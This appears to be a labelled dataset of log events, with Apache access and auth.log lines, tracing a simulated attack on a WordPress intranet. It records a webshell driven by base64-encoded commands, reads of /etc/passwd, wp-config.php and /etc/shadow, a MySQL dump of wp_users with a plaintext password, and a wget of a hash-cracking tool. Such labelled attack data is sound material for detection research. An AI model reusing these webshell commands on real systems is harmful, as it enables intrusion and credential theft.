event_id,datetime,display_name,decoded,ground_truth_label
6,2022-01-18T12:37:49.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),dirb_scan
9,2022-01-18T12:38:00.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,upload_rce_shell
12,2022-01-18T12:38:04.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""id""]]",check_user_id
13,2022-01-18T12:38:06.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""netstat"", ""-t""]]",check_netstat_t
14,2022-01-18T12:38:08.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/etc/resolv.conf""]]",read_resolv
15,2022-01-18T12:38:09.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""ip"", ""addr""]]",check_network_config
16,2022-01-18T12:38:11.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""ps"", ""-A""]]",check_ps_a
17,2022-01-18T12:38:14.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""lsb_release"", ""-a""]]",check_release
18,2022-01-18T12:38:16.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/etc/group""]]",read_group
19,2022-01-18T12:38:17.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/etc/passwd""]]",read_passwd
20,2022-01-18T12:38:19.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""date""]]",check_date
21,2022-01-18T12:38:21.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""ls"", ""-laR"", ""/var/www""]]",list_web_dir
22,2022-01-18T12:38:23.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/var/www/intranet.price.fox.org/wp-config.php""]]",check_wp_config
23,2022-01-18T12:38:25.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""mysql"", ""-u"", ""wordpress"", ""-ptainoox3aedeeSh"", ""wordpress_db"", ""-e"", ""\""select * from wp_users\""""]]",dump_wp_users
24,2022-01-18T12:38:27.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/etc/profile""]]",read_profile
25,2022-01-18T12:38:29.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""wget"", ""https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz""]]",decide_crack_method
29,2022-01-18T12:39:11.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""./wphashcrack-0.1/wphashcrack.sh"", ""-w"", ""$PWD/rockyou.txt"", ""-j"", ""./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run"", ""-u"", ""phopkins""]]",crack_wphash
31,2022-01-18T13:14:41.000000+00:00,OS:evidences\\\\auth.log,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list,check_sudo
32,2022-01-18T13:14:43.000000+00:00,OS:evidences\\\\auth.log,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/,list_root
33,2022-01-18T13:14:49.000000+00:00,OS:evidences\\\\auth.log,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow,read_shadow
34,2022-01-18T13:14:50.000000+00:00,OS:/mnt/d/0experiment/1-1-plaso-sec/data-p-ait-v2-wilson/evidences/auth.log,[sudo] jwilkinson : TTY=pts/1 ; PWD=/var/www/intranet.hallbrown.wilson.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/sbin/iptables -L,sudo_iptables
